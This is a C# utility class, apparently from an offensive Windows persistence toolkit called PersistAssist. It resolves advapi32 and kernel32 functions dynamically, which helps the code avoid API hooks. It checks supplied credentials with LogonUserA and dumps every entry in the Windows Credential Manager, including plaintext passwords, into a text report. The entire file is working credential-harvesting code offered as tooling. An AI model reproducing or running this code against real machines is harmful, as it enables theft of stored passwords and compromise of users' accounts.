using System;
using System.Collections.Generic;

using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

using static System.Runtime.InteropServices.Marshal;

using static PersistAssist.Models.Data;
using static PersistAssist.Utils.Structs;

namespace PersistAssist.Utils
{
    public class Creds
    {
        //https://gist.github.com/meziantou/10311113
        //https://github.com/meziantou/Meziantou.Framework/tree/main/src/Meziantou.Framework.Win32.CredentialManager

        public static string credCheck(string username, string password, string domain)
        {
            int _out = 0;

            IntPtr ptr = API.TSS.GetLibraryAddress("advapi32.dll", "LogonUserA");
            var LogonUser = GetDelegateForFunctionPointer(ptr, typeof(API.Delegates.LogonUserA)) as API.Delegates.LogonUserA;

            ptr = API.TSS.GetLibraryAddress("kernel32.dll", "GetLastError");
            var GetLastError = GetDelegateForFunctionPointer(ptr, typeof(API.Delegates.GetLastError)) as API.Delegates.GetLastError;

            _ = LogonUser(username, domain, password, Structs.CredStructs.LOGON32_LOGON_NETWORK, Structs.CredStructs.LOGON32_PROVIDER_DEFAULT, ref _out);

            if (_out != 0) { return "Valid Credentials"; } else { return $"Error: {(Enums.ErrorCodes)GetLastError()}"; }
        }

        public static string readCredData()
        {
            StringBuilder credData = new StringBuilder();

            List<Credential> credList = CredEnum();

            foreach (Credential cred in credList)
            {
                credData.AppendLine(
                    $"AppName:  {cred.ApplicationName}\n" +
                    $"CredType: {cred.CredentialType}\n" +
                    $"UserName: {cred.UserName}\n" +
                    $"Password: {cred.Password}\n"
                    );
            }

            return credData.ToString();
        }

        public static Credential ReadCredential(CredStructs.CREDENTIAL credential)
        {
            string applicationName = Marshal.PtrToStringUni(credential.TargetName);
            string userName = Marshal.PtrToStringUni(credential.UserName);
            string secret = null;
            if (credential.CredentialBlob != IntPtr.Zero)
            {
                secret = Marshal.PtrToStringUni(credential.CredentialBlob, (int)credential.CredentialBlobSize / 2);
            }

            return new Credential(credential.Type, applicationName, userName, secret);
        }

        public static List<Credential> CredEnum()
        {

            IntPtr ptr = API.TSS.GetLibraryAddress("AdvApi32.dll", "CredEnumerateW");
            var CredEnumerate = Marshal.GetDelegateForFunctionPointer(ptr, typeof(API.Delegates.CredEnumerateA)) as API.Delegates.CredEnumerateA;

            ptr = API.TSS.GetLibraryAddress("advapi32.dll", "CredFree");
            var CredFree = GetDelegateForFunctionPointer(ptr, typeof(API.Delegates.CredFree)) as API.Delegates.CredFree;

            List<Credential> creds = new List<Credential>();

            bool credEnumStatus = CredEnumerate(null, 0x1, out int credCount, out IntPtr pCreds);

            if (credEnumStatus)
            {
                for (int i = 0; i < credCount; i++)
                {
                    IntPtr credential = Marshal.ReadIntPtr(pCreds, i * Marshal.SizeOf(typeof(IntPtr)));
                    creds.Add(ReadCredential((CredStructs.CREDENTIAL)Marshal.PtrToStructure(credential, typeof(CredStructs.CREDENTIAL))));
                }
                CredFree(pCreds);
            }
            else
            {
                int lastError = Marshal.GetLastWin32Error();
                Console.WriteLine(lastError);
                throw new Win32Exception(lastError);
            }

            return creds;
        }

        public class Credential
        {
            private readonly string _applicationName;
            private readonly string _userName;
            private readonly string _password;
            private readonly CredStructs.CredentialType _credentialType;

            public CredStructs.CredentialType CredentialType { get { return _credentialType; } }

            public string ApplicationName { get { return _applicationName; } }

            public string UserName { get { return _userName; } }

            public string Password { get { return _password; } }

            public Credential(CredStructs.CredentialType credentialType, string applicationName, string userName, string password)
            {
                _applicationName = applicationName;
                _userName = userName;
                _password = password;
                _credentialType = credentialType;
            }
        }

    }
}
